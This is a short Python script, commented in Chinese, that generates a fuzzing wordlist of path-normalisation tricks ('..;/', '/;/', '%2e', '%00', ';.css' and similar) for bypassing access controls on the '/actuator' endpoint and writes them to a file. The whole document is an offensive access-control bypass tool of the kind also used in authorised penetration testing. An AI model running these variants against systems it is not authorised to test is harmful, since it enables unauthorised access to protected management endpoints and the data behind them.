pairs = [["/", "//"],["/./","/;/"], ["/%2e/"]]

pdd = ["/",";/","../","..;/",]

trailings = ["","/", "/..;/", "%20", "%09", "%00",
             ".json",";.css",".css", ".html", "?", "??", "???",
             "?testparam", "#", "#test", "/."]

# 需要绕过的目录，推荐最大不超过2及目录，及：/api/test
#
dir = "/actuator".split("/")
print(dir)
NewDir=[]

def secondarydir():
    with open("./fuzzDir.txt",mode="a+",encoding="utf-8") as f :
        for i_ in trailings:
            for  _ in NewDir:
                # print(_+_+dir[2]+i_)
                for k in pdd:
                    fuzz = _+k+dir[2]+i_
                    f.write(fuzz)
                    f.write("\n")
        f.close()

for i in pairs:
    with open("./fuzzDir.txt",mode="a+",encoding="utf-8") as f :
        for _ in i:
            tempdir = str(_)+str(dir[1])
            if (len(dir)>=3):
                NewDir.append(str(tempdir))
                secondarydir()
            else:
                for k in trailings:
                    temp = (tempdir+k)
                    f.write(temp)
                    f.write("\n")
